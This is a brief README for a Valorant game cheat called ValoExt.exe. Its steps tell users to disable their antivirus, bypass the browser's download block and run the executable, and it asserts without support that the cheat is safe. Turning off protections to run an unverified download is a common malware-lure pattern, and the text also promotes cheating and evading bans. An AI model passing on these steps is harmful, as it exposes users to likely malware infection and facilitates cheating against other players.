```sh-session
Only Download Launchers from the Releases Tab. The ones there are Up-To-Date.
```


### STEPS
```sh-session
[1] Disable any Antivirus that is active. (Antivirus will block the game cheat from loading properly.)
[2] Download and Unzip the zip folder into any directory.
[3] Download ValoExt.exe from the releases tab. Your web browser may block the download. To bypass, open the full downloads page and select 'keep anyway'.
[4] Run ValoExt.exe BEFORE Opening Valorant

```
### Have Fun! But one more thing...
Although this cheat IS safe, I recommend using an ALT Account or your own Driver. I have not been banned yet, but I am not responsible for you.
